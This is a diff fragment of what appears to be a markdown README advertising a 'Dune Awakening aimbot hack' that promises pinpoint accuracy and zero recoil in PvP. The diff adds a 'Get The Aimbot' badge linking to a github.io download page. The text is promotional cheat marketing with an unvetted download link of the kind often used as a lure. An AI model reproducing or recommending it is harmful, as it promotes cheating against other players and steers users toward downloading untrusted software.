@@ -4,7 +4,7 @@
 
 When spice wars heat up and every bullet counts, the **Dune Awakening aimbot hack** becomes a game-changer. With pinpoint accuracy and zero recoil, you can dominate PvP raids, defend spice harvesters, and stay on top of the desert hierarchy. Let’s break down how aimbots enhance survival and PvP combat in Dune Awakening.
 
-
+[![Get](https://img.shields.io/badge/Get%20The-Aimbot-blueviolet)](https://dune-awakening-aimbot.github.io/.github/)
 ---
 
 ## Product Description
